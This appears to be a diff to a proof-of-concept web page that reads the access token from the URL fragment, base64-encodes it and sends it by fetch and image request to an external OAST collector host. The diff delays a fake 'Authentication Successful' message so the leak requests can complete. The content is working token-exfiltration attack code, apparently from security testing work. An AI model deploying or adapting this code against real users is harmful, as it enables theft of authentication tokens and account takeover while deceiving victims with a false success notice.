@@ -8,7 +8,7 @@
         var fragment = window.location.hash;
 
         if (fragment) {
-            // 2. Your new OAST URL
+            // 2. Your active OAST URL
             var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);
 
             // 3. Primary Send: Fetch
@@ -19,7 +19,11 @@
             leak.src = oastUrl;
 
             console.log("Token sent to OAST!");
-            document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
+            
+            // Give the browser time to complete the background requests
+            setTimeout(function(){
+                document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
+            }, 1000);
         } else {
             document.body.innerHTML = "<h1>Error: No fragment found.</h1><p>Ensure the URL contains a # fragment.</p>";
         }
